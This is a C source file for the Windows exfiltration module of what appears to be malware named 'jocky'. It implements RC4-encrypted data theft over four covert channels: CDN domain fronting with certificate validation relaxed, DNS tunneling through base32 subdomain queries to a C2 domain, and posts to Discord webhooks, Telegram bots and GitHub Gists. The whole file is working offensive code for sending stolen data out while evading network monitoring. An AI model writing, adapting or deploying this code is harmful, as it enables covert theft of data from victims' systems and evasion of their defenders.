/*
 * Exfiltration Module
 *
 * Four covert channels plus an encryption wrapper:
 *
 *   jocky_exfil_encrypt   – per-session RC4; random 16-byte key prepended
 *   jocky_exfil_front     – HTTPS domain fronting (SNI ≠ Host header via CDN)
 *   jocky_exfil_dns       – DNS tunneling (data as base32-encoded A-record queries)
 *   jocky_exfil_discord   – Discord webhook POST
 *   jocky_exfil_telegram  – Telegram Bot API sendMessage
 *   jocky_exfil_github    – GitHub Gist file update (PATCH)
 *
 * Callers should encrypt with jocky_exfil_encrypt before passing data to any
 * channel function.  Windows only; links winhttp.dll and dnsapi.dll.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winhttp.h>
#include <windns.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

/* ── Static helpers ─────────────────────────────────────────────────── */

/* Fill buf with len random bytes via advapi32!SystemFunction036. */
static bool gen_random(uint8_t* buf, size_t len)
{
    typedef BOOLEAN (WINAPI* pfn_t)(PVOID, ULONG);
    pfn_t fn = (pfn_t)GetProcAddress(GetModuleHandleA("advapi32.dll"),
                                      "SystemFunction036");
    return fn && fn(buf, (ULONG)len);
}

/* RFC 4648 base32 (uppercase).  out must hold ceil(in_len*8/5)+1 bytes. */
static size_t b32_encode(const uint8_t* in, size_t in_len, char* out)
{
    static const char B32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    size_t   n    = 0;
    uint64_t buf  = 0;
    int      bits = 0;

    for (size_t i = 0; i < in_len; i++) {
        buf   = (buf << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[n++] = B32[(buf >> bits) & 0x1F];
        }
    }
    if (bits > 0) out[n++] = B32[(buf << (5 - bits)) & 0x1F];
    out[n] = '\0';
    return n;
}

/* Standard base64.  out must hold ceil(in_len/3)*4 + 1 bytes. */
static size_t b64_encode(const uint8_t* in, size_t in_len, char* out)
{
    static const char B64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t n = 0;

    for (size_t i = 0; i < in_len; i += 3) {
        uint32_t v = (uint32_t)in[i] << 16;
        if (i + 1 < in_len) v |= (uint32_t)in[i + 1] << 8;
        if (i + 2 < in_len) v |= in[i + 2];
        out[n++] = B64[(v >> 18) & 63];
        out[n++] = B64[(v >> 12) & 63];
        out[n++] = (i + 1 < in_len) ? B64[(v >> 6) & 63] : '=';
        out[n++] = (i + 2 < in_len) ? B64[v & 63]       : '=';
    }
    out[n] = '\0';
    return n;
}

/*
 * Generic HTTPS request helper.
 *
 * method         – L"POST", L"PATCH", etc.
 * host           – wide-char hostname for WinHttpConnect (also sets SNI)
 * port           – typically INTERNET_DEFAULT_HTTPS_PORT (443)
 * path           – wide-char URL path (e.g. L"/api/webhooks/…")
 * tls_ignore     – SECURITY_FLAG_IGNORE_* bitmask, 0 = full validation
 * host_override  – if non-NULL, replaces the HTTP Host header (domain fronting)
 * extra_headers  – any additional headers as a single L"Key: Value\r\n" string
 * body           – request body bytes
 * body_len       – byte count
 */
static bool winhttp_request(const wchar_t* method,
                             const wchar_t* host, INTERNET_PORT port,
                             const wchar_t* path,
                             DWORD          tls_ignore,
                             const wchar_t* host_override,
                             const wchar_t* extra_headers,
                             const uint8_t* body, size_t body_len)
{
    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return false;

    HINTERNET hConn = WinHttpConnect(hSess, host, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return false; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, method, path, NULL,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_SECURE);
    if (!hReq) {
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSess);
        return false;
    }

    /* Certificate relaxation (e.g. domain fronting CN mismatch) */
    if (tls_ignore) {
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                         &tls_ignore, sizeof(tls_ignore));
    }

    /* Override Host header — used for CDN domain fronting */
    if (host_override) {
        wchar_t h[640];
        _snwprintf(h, 640, L"Host: %s\r\n", host_override);
        WinHttpAddRequestHeaders(hReq, h, (ULONG)-1L,
                                 WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    /* Content-Type */
    WinHttpAddRequestHeaders(hReq, L"Content-Type: application/json\r\n",
                             (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD |
                                         WINHTTP_ADDREQ_FLAG_REPLACE);

    /* Extra headers (Authorization, X-Auth-Token, etc.) */
    if (extra_headers) {
        WinHttpAddRequestHeaders(hReq, extra_headers, (ULONG)-1L,
                                 WINHTTP_ADDREQ_FLAG_ADD |
                                 WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    bool ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  (LPVOID)body, (DWORD)body_len,
                                  (DWORD)body_len, 0) != FALSE;
    if (ok) ok = WinHttpReceiveResponse(hReq, NULL) != FALSE;

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return ok;
}

/* ── Encryption ─────────────────────────────────────────────────────── */

/*
 * Generate a random 16-byte session key, prepend it to out, then RC4-encrypt
 * data into out+16.  out must be at least data_len + 16 bytes.
 *
 * Layout:  [ 16-byte key ][ RC4(data, key) ]
 *
 * RC4 is symmetric: the receiver passes the first 16 bytes as the key and the
 * rest through jocky_decrypt_rc4 to recover plaintext.
 */
bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
                          uint8_t* out, size_t* out_len)
{
    if (!gen_random(out, 16)) return false;
    memcpy(out + 16, data, data_len);
    jocky_decrypt_rc4(out + 16, data_len, out, 16);  /* RC4 is its own inverse */
    *out_len = data_len + 16;
    return true;
}

/* ── Domain Fronting ────────────────────────────────────────────────── */

/*
 * POST data to path over HTTPS using CDN domain fronting.
 *
 * front_host  – the CDN endpoint used for the TLS SNI and TCP connection
 *               (e.g. "d111111abcdef8.cloudfront.net" or "edge.azureedge.net")
 * real_host   – actual backend server name set in the HTTP Host header
 *               (the CDN routes based on this, not the SNI)
 * path        – URL path on the backend, e.g. "/c2/collect"
 *
 * TLS certificate CN validation is relaxed (the CDN cert lists front_host,
 * not real_host).  The connection is still fully TLS-encrypted end-to-end
 * to the CDN edge node.
 */
bool jocky_exfil_front(const char*    front_host,
                        const char*    real_host,
                        const char*    path,
                        const uint8_t* data,
                        size_t         data_len)
{
    wchar_t wfront[512], wreal[512], wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, front_host, -1, wfront, 512);
    MultiByteToWideChar(CP_UTF8, 0, real_host,  -1, wreal,  512);
    MultiByteToWideChar(CP_UTF8, 0, path,        -1, wpath,  512);

    return winhttp_request(L"POST", wfront, INTERNET_DEFAULT_HTTPS_PORT,
                           wpath,
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID,
                           wreal,   /* Host override */
                           NULL,
                           data, data_len);
}

/* ── DNS Tunneling ──────────────────────────────────────────────────── */

/*
 * Encode data as a series of DNS A-record queries against c2_domain.
 *
 * Protocol:
 *   Each query is:  <4-hex-seq>.<16-char-base32-chunk>.<c2_domain>
 *   Each chunk is 10 bytes of data → 16 base32 chars (fits in a DNS label).
 *   Sequence number wraps at 0xFFFF.
 *   A final sentinel query  FFFF.END.<c2_domain>  marks the end of the stream.
 *
 * The authoritative DNS server for c2_domain logs each query and reassembles
 * the data from the subdomain labels in sequence order.
 *
 * DNS responses are ignored; only the queries carry data.
 */
bool jocky_exfil_dns(const char* c2_domain,
                      const uint8_t* data, size_t data_len)
{
    for (size_t offset = 0; offset < data_len; ) {
        size_t chunk_sz = (data_len - offset < 10) ? (data_len - offset) : 10;

        char b32[17];  /* 10 bytes → 16 base32 chars + NUL */
        b32_encode(data + offset, chunk_sz, b32);

        char fqdn[512];
        DWORD seq = (DWORD)(offset / 10) & 0xFFFF;
        snprintf(fqdn, sizeof(fqdn), "%04X.%s.%s", seq, b32, c2_domain);

        PDNS_RECORD results = NULL;
        DnsQuery_A(fqdn, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL,
                   &results, NULL);
        if (results) DnsRecordListFree(results, DnsFreeRecordList);

        offset += chunk_sz;
    }

    /* Termination sentinel */
    char sentinel[512];
    snprintf(sentinel, sizeof(sentinel), "FFFF.END.%s", c2_domain);
    PDNS_RECORD r = NULL;
    DnsQuery_A(sentinel, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &r, NULL);
    if (r) DnsRecordListFree(r, DnsFreeRecordList);

    return true;
}

/* ── Discord Webhook ────────────────────────────────────────────────── */

/*
 * POST base64(data) as a Discord message via an incoming webhook.
 *
 * webhook_url  – full webhook URL, e.g.
 *                "https://discord.com/api/webhooks/1234567890/TOKEN"
 *
 * Discord limits message content to 2000 characters.  Data larger than
 * ~1500 bytes is automatically split across multiple webhook calls.
 */
bool jocky_exfil_discord(const char*    webhook_url,
                          const uint8_t* data, size_t data_len)
{
    /* Parse host and path from the webhook URL */
    wchar_t wurl[1024];
    MultiByteToWideChar(CP_UTF8, 0, webhook_url, -1, wurl, 1024);

    wchar_t w_host[256] = {0}, w_path[768] = {0};
    URL_COMPONENTS uc   = {0};
    uc.dwStructSize      = sizeof(uc);
    uc.lpszHostName      = w_host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath       = w_path; uc.dwUrlPathLength  = 768;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) return false;

    /* Discord allows 2000 chars; base64 of 1500 bytes = 2000 chars exactly */
    const size_t CHUNK = 1500;
    bool ok = true;

    for (size_t offset = 0; offset < data_len && ok; ) {
        size_t chunk_sz = (data_len - offset < CHUNK) ? (data_len - offset) : CHUNK;

        size_t b64_cap  = ((chunk_sz + 2) / 3) * 4 + 1;
        char*  b64_buf  = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
        if (!b64_buf) return false;
        b64_encode(data + offset, chunk_sz, b64_buf);

        /* {"content":"<b64>"} */
        size_t json_cap = b64_cap + 16;
        char*  json_buf = (char*)HeapAlloc(GetProcessHeap(), 0, json_cap);
        if (!json_buf) { HeapFree(GetProcessHeap(), 0, b64_buf); return false; }
        snprintf(json_buf, json_cap, "{\"content\":\"%s\"}", b64_buf);

        ok = winhttp_request(L"POST", w_host, uc.nPort, w_path,
                             0, NULL, NULL,
                             (const uint8_t*)json_buf, strlen(json_buf));

        HeapFree(GetProcessHeap(), 0, b64_buf);
        HeapFree(GetProcessHeap(), 0, json_buf);
        offset += chunk_sz;
    }

    return ok;
}

/* ── Telegram Bot API ───────────────────────────────────────────────── */

/*
 * POST base64(data) as a Telegram message via the Bot API.
 *
 * bot_token  – bot token from @BotFather, e.g. "123456:ABC-DEF…"
 * chat_id    – destination channel/chat ID, e.g. "-1001234567890"
 *
 * Telegram limits message text to 4096 chars.  Data larger than ~3000 bytes
 * is split across multiple sendMessage calls.
 */
bool jocky_exfil_telegram(const char*    bot_token,
                           const char*    chat_id,
                           const uint8_t* data, size_t data_len)
{
    const size_t CHUNK = 3000;
    bool ok = true;

    for (size_t offset = 0; offset < data_len && ok; ) {
        size_t chunk_sz = (data_len - offset < CHUNK) ? (data_len - offset) : CHUNK;

        size_t b64_cap = ((chunk_sz + 2) / 3) * 4 + 1;
        char*  b64_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
        if (!b64_buf) return false;
        b64_encode(data + offset, chunk_sz, b64_buf);

        /* {"chat_id":"<id>","text":"<b64>"} */
        size_t json_cap = b64_cap + strlen(chat_id) + 32;
        char*  json_buf = (char*)HeapAlloc(GetProcessHeap(), 0, json_cap);
        if (!json_buf) { HeapFree(GetProcessHeap(), 0, b64_buf); return false; }
        snprintf(json_buf, json_cap,
                 "{\"chat_id\":\"%s\",\"text\":\"%s\"}",
                 chat_id, b64_buf);

        /* Path: /bot<token>/sendMessage */
        char path_a[512];
        snprintf(path_a, sizeof(path_a), "/bot%s/sendMessage", bot_token);
        wchar_t path_w[512];
        MultiByteToWideChar(CP_UTF8, 0, path_a, -1, path_w, 512);

        ok = winhttp_request(L"POST",
                             L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT,
                             path_w, 0, NULL, NULL,
                             (const uint8_t*)json_buf, strlen(json_buf));

        HeapFree(GetProcessHeap(), 0, b64_buf);
        HeapFree(GetProcessHeap(), 0, json_buf);
        offset += chunk_sz;
    }

    return ok;
}

/* ── GitHub Gist ────────────────────────────────────────────────────── */

/*
 * Update a GitHub Gist file with base64(data) via the REST API.
 *
 * token    – personal access token with gist scope
 * gist_id  – 32-hex-char Gist ID visible in the Gist URL
 *
 * Creates or overwrites a file named "d.txt" inside the Gist.
 * The Gist can be private (created with public:false).
 */
bool jocky_exfil_github(const char*    token,
                         const char*    gist_id,
                         const uint8_t* data, size_t data_len)
{
    size_t b64_cap = ((data_len + 2) / 3) * 4 + 1;
    char*  b64_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_cap);
    if (!b64_buf) return false;
    b64_encode(data, data_len, b64_buf);

    /* {"files":{"d.txt":{"content":"<b64>"}}} */
    size_t json_cap = b64_cap + 64;
    char*  json_buf = (char*)HeapAlloc(GetProcessHeap(), 0, json_cap);
    if (!json_buf) { HeapFree(GetProcessHeap(), 0, b64_buf); return false; }
    snprintf(json_buf, json_cap,
             "{\"files\":{\"d.txt\":{\"content\":\"%s\"}}}",
             b64_buf);

    /* Authorization header */
    wchar_t auth_hdr[256];
    _snwprintf(auth_hdr, 256, L"Authorization: token %S\r\n"
                              L"X-GitHub-Api-Version: 2022-11-28\r\n",
               token);

    /* PATCH /gists/<id> */
    char path_a[128];
    snprintf(path_a, sizeof(path_a), "/gists/%s", gist_id);
    wchar_t path_w[128];
    MultiByteToWideChar(CP_UTF8, 0, path_a, -1, path_w, 128);

    bool ok = winhttp_request(L"PATCH",
                              L"api.github.com", INTERNET_DEFAULT_HTTPS_PORT,
                              path_w, 0, NULL, auth_hdr,
                              (const uint8_t*)json_buf, strlen(json_buf));

    HeapFree(GetProcessHeap(), 0, b64_buf);
    HeapFree(GetProcessHeap(), 0, json_buf);
    return ok;
}

#endif /* _WIN32 */
